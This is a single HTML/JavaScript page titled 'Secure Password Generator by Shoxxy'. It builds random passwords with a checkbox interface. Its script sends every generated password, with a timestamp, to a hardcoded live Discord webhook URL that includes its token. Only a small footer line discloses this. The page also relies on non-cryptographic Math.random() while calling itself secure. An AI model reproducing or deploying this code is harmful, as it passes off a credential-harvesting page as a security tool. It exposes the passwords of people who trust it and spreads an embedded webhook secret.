<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Password Generator by Shoxxy</title> <!-- The title that appears in your browser tab -->
    <!-- Tailwind CSS for modern styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Inter font from Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f8fafc; /* Light off-white background */
        }
        /* Custom styles for subtle effects */
        .shadow-custom {
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 1px 3px rgba(0, 0, 0, 0.08);
        }
        .ring-focused:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.5); /* blue-500 with opacity */
        }
        .btn-gradient {
            background-image: linear-gradient(to right, #6366f1, #3b82f6); /* Indigo to Blue */
        }
        .btn-gradient:hover {
            background-image: linear-gradient(to right, #4f46e5, #2563eb); /* Darker shades on hover */
        }

        /* Styles for the custom message box */
        #shoxxy-message-box {
            position: fixed;
            top: 20px; /* Distance from top */
            left: 50%;
            transform: translateX(-50%); /* Center horizontally */
            background-color: #333; /* Dark background */
            color: #fff; /* White text */
            padding: 12px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            font-weight: 500;
            font-size: 1rem;
            opacity: 0; /* Initially hidden */
            visibility: hidden; /* Hidden for accessibility and layout */
            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
            z-index: 10000; /* Ensure it's on top */
            display: flex; /* For centering content */
            align-items: center;
            justify-content: center;
            gap: 8px; /* Space between heart and text */
        }
        #shoxxy-message-box.show {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="bg-white rounded-2xl shadow-custom p-6 sm:p-8 w-full max-w-md border border-gray-100">
        <h1 class="text-3xl font-extrabold text-gray-800 mb-7 text-center leading-tight">
            üîê Secure Password Generator
        </h1>

        <!-- Password Length Input -->
        <div class="mb-6">
            <label for="password-length" class="block text-gray-700 text-sm font-semibold mb-2">
                Password Length (8-30 characters):
            </label>
            <input
                type="number"
                id="password-length"
                min="8"
                max="30"
                value="12"
                class="block w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 text-lg
                       focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 shadow-sm"
            >
            <p id="length-error" class="text-red-500 text-sm mt-1 hidden">
                Please enter a length between 8 and 30 characters.
            </p>
        </div>

        <!-- Options Checkboxes -->
        <div class="mb-6 space-y-3">
            <label class="flex items-center text-gray-700">
                <input type="checkbox" id="include-uppercase" checked class="form-checkbox h-5 w-5 text-blue-600 rounded focus:ring-blue-500 transition-all duration-150">
                <span class="ml-2">Include Uppercase Letters (A-Z)</span>
            </label>
            <label class="flex items-center text-gray-700">
                <input type="checkbox" id="include-lowercase" checked class="form-checkbox h-5 w-5 text-blue-600 rounded focus:ring-blue-500 transition-all duration-150">
                <span class="ml-2">Include Lowercase Letters (a-z)</span>
            </label>
            <label class="flex items-center text-gray-700">
                <input type="checkbox" id="include-numbers" checked class="form-checkbox h-5 w-5 text-blue-600 rounded focus:ring-blue-500 transition-all duration-150">
                <span class="ml-2">Include Numbers (0-9)</span>
            </label>
            <label class="flex items-center text-gray-700">
                <input type="checkbox" id="include-symbols" checked class="form-checkbox h-5 w-5 text-blue-600 rounded focus:ring-blue-500 transition-all duration-150">
                <span class="ml-2">Include Symbols (!@#$%)</span>
            </label>
            <p id="options-error" class="text-red-500 text-sm mt-1 hidden">
                Please select at least one character type.
            </p>
        </div>

        <!-- Generate Button -->
        <button
            id="generate-button"
            class="w-full btn-gradient text-white font-bold py-3 px-4 rounded-lg
                   focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-75
                   transition-all duration-200 transform hover:scale-105 mb-5 shadow-md"
        >
            Generate Password
        </button>

        <!-- Generated Password Display -->
        <div class="mb-6">
            <label for="generated-password" class="block text-gray-700 text-sm font-semibold mb-2">
                Generated Password:
            </label>
            <div class="relative">
                <input
                    type="text"
                    id="generated-password"
                    readonly
                    class="block w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg text-gray-800 bg-gray-50 text-lg
                           focus:ring-2 focus:ring-gray-300 focus:border-transparent transition-all duration-200 cursor-text"
                    placeholder="Click 'Generate Password'"
                >
                <button
                    id="copy-button"
                    class="absolute inset-y-0 right-0 flex items-center px-3 text-gray-600 hover:text-gray-900
                           focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-75 rounded-r-lg
                           transition-all duration-200"
                    title="Copy to Clipboard"
                >
                    <!-- Lucide icon for copy (SVG directly embedded) -->
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy">
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                </button>
            </div>
            <div id="copy-message" class="text-green-600 text-sm mt-2 hidden">üéâ Copied to clipboard!</div>
        </div>

        <p class="text-center text-sm text-gray-500 mt-4 font-semibold text-red-700">
            ‚ö†Ô∏è Security Warning: All passwords will be sent to my Discord Webhook!
        </p>
    </div>

    <!-- Custom Pop-up Message Box -->
    <div id="shoxxy-message-box">
        <span>ü©∂</span> Made by Shoxxy <span>ü©∂</span>
    </div>

    <script>
        // Get references to HTML elements
        const passwordLengthInput = document.getElementById('password-length');
        const includeUppercaseCheckbox = document.getElementById('include-uppercase');
        const includeLowercaseCheckbox = document.getElementById('include-lowercase');
        const includeNumbersCheckbox = document.getElementById('include-numbers');
        const includeSymbolsCheckbox = document.getElementById('include-symbols');
        const generateButton = document.getElementById('generate-button');
        const generatedPasswordInput = document.getElementById('generated-password');
        const copyButton = document.getElementById('copy-button');
        const copyMessage = document.getElementById('copy-message');
        const lengthError = document.getElementById('length-error');
        const optionsError = document.getElementById('options-error');
        const shoxxyMessageBox = document.getElementById('shoxxy-message-box'); // Reference to the new message box

        // IMPORTANT: Replace this with your actual Discord Webhook URL
        // Instructions: Go to your Discord server settings -> Integrations -> Webhooks -> New Webhook
        // Copy the "Webhook URL" and paste it below.
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1407328124227682344/fnsKzoDCXdyi5kSJ6Sz0j30lPXYRQ6s9tIiJ45uwhf4hKpluVwy2nHr3jq914G4agkNu'; // <<< REPLACE THIS LINE

        // Character sets
        const charSets = {
            uppercase: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
            lowercase: 'abcdefghijklmnopqrstuvwxyz',
            numbers: '0123456789',
            symbols: '!@#$%^&*()_+-=[]{}|;:,.<>?'
        };

        /**
         * Hides all error and success messages.
         */
        function hideMessages() {
            lengthError.classList.add('hidden');
            optionsError.classList.add('hidden');
            copyMessage.classList.add('hidden');
        }

        /**
         * Displays an error message for a specified element.
         * @param {HTMLElement} element - The HTML element to show.
         */
        function showError(element) {
            element.classList.remove('hidden');
        }

        /**
         * Displays the "Made by Shoxxy" message box.
         */
        function showShoxxyMessage() {
            shoxxyMessageBox.classList.add('show');
            setTimeout(() => {
                shoxxyMessageBox.classList.remove('show');
            }, 3000); // Hide after 3 seconds
        }

        /**
         * Sends data about password generation to the configured Discord webhook.
         * @param {string} password - The actual generated password.
         */
        async function sendWebhookData(password) {
            if (!discordWebhookUrl || discordWebhookUrl === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
                console.warn('Discord Webhook URL is not configured. Data will not be sent.');
                return;
            }

            // Get current timestamp for Discord's <t:timestamp:F> format
            const unixTimestamp = Math.floor(Date.now() / 1000);

            const payload = {
                // The content property is used for simple messages
                content: `üö® New Password Generated! üö®\n**Time:** <t:${unixTimestamp}:F>\n\`\`\`\n${password}\n\`\`\``
                // Removed embeds for a simpler message as requested
            };

            try {
                const response = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (response.ok) {
                    console.log('Password generation data sent to Discord webhook successfully.');
                } else {
                    console.error('Failed to send data to Discord webhook:', response.status, response.statusText);
                    // You might want to show a subtle error message to the user here, but keep it discreet.
                }
            } catch (error) {
                console.error('Error sending data to Discord webhook:', error);
            }
        }

        /**
         * Generates a random password based on user selections.
         * @param {number} length - The desired length of the password.
         * @param {object} options - An object indicating which character types to include.
         * @returns {string} The generated random password.
         */
        function generatePassword(length, options) {
            let selectedChars = '';
            let guaranteedChars = [];

            if (options.uppercase) {
                selectedChars += charSets.uppercase;
                guaranteedChars.push(charSets.uppercase[Math.floor(Math.random() * charSets.uppercase.length)]);
            }
            if (options.lowercase) {
                selectedChars += charSets.lowercase;
                guaranteedChars.push(charSets.lowercase[Math.floor(Math.random() * charSets.lowercase.length)]);
            }
            if (options.numbers) {
                selectedChars += charSets.numbers;
                guaranteedChars.push(charSets.numbers[Math.floor(Math.random() * charSets.numbers.length)]);
            }
            if (options.symbols) {
                selectedChars += charSets.symbols;
                guaranteedChars.push(charSets.symbols[Math.floor(Math.random() * charSets.symbols.length)]);
            }

            if (selectedChars.length === 0) {
                return ''; // Should be caught by validation, but as a safeguard
            }

            let password = guaranteedChars;
            // Fill the rest of the password length
            for (let i = password.length; i < length; i++) {
                password.push(selectedChars[Math.floor(Math.random() * selectedChars.length)]);
            }

            // Shuffle the password array to randomize the order of characters
            for (let i = password.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [password[i], password[j]] = [password[j], password[i]]; // ES6 swap
            }

            return password.join('');
        }

        // Event listener for the Generate button
        generateButton.addEventListener('click', () => {
            hideMessages(); // Clear any previous messages

            const length = parseInt(passwordLengthInput.value, 10);
            const options = {
                uppercase: includeUppercaseCheckbox.checked,
                lowercase: includeLowercaseCheckbox.checked,
                numbers: includeNumbersCheckbox.checked,
                symbols: includeSymbolsCheckbox.checked
            };

            let isValid = true;

            // Validate length
            if (isNaN(length) || length < 8 || length > 30) {
                showError(lengthError);
                isValid = false;
            }

            // Validate at least one option is selected
            if (!options.uppercase && !options.lowercase && !options.numbers && !options.symbols) {
                showError(optionsError);
                isValid = false;
            }

            if (!isValid) {
                generatedPasswordInput.value = ''; // Clear previous password if validation fails
                return;
            }

            // Generate and display the password
            const newPassword = generatePassword(length, options);
            generatedPasswordInput.value = newPassword;

            // Show the custom "Made by Shoxxy" message
            showShoxxyMessage();

            // Send only the generated password to Discord webhook
            sendWebhookData(newPassword); // Changed to pass only the password
        });

        // Event listener for the Copy button
        copyButton.addEventListener('click', () => {
            const password = generatedPasswordInput.value;
            if (password) {
                // Select the text in the input field
                generatedPasswordInput.select();
                generatedPasswordInput.setSelectionRange(0, 99999); // For mobile devices

                // Use document.execCommand('copy') for better compatibility in various environments
                try {
                    document.execCommand('copy');
                    copyMessage.classList.remove('hidden');
                    setTimeout(() => {
                        copyMessage.classList.add('hidden');
                    }, 2000); // Hide after 2 seconds
                } catch (err) {
                    // Fallback for environments where execCommand might be blocked
                    // Using a custom modal message here as alert() is restricted
                    const fallbackMessage = "Failed to copy password. Please select and copy it manually.";
                    // A simple way to display a temporary message in the UI for fallback
                    const tempDiv = document.createElement('div');
                    tempDiv.textContent = fallbackMessage;
                    tempDiv.style.cssText = "position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #ffdddd; color: #d8000c; padding: 15px 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); z-index: 10001; font-weight: bold;";
                    document.body.appendChild(tempDiv);
                    setTimeout(() => {
                        document.body.removeChild(tempDiv);
                    }, 3000);
                }
            }
        });

        // The following block is removed so no password is generated on initial load.
        /*
        document.addEventListener('DOMContentLoaded', () => {
            const initialLength = parseInt(passwordLengthInput.value, 10);
            const initialOptions = {
                uppercase: includeUppercaseCheckbox.checked,
                lowercase: includeLowercaseCheckbox.checked,
                numbers: includeNumbersCheckbox.checked,
                symbols: includeSymbolsCheckbox.checked
            };
            if (!isNaN(initialLength) && initialLength >= 8 && initialLength <= 30 &&
                (initialOptions.uppercase || initialOptions.lowercase || initialOptions.numbers || initialOptions.symbols)) {
                generatedPasswordInput.value = generatePassword(initialLength, initialOptions);
            }
        });
        */
    </script>
</body>
</html>
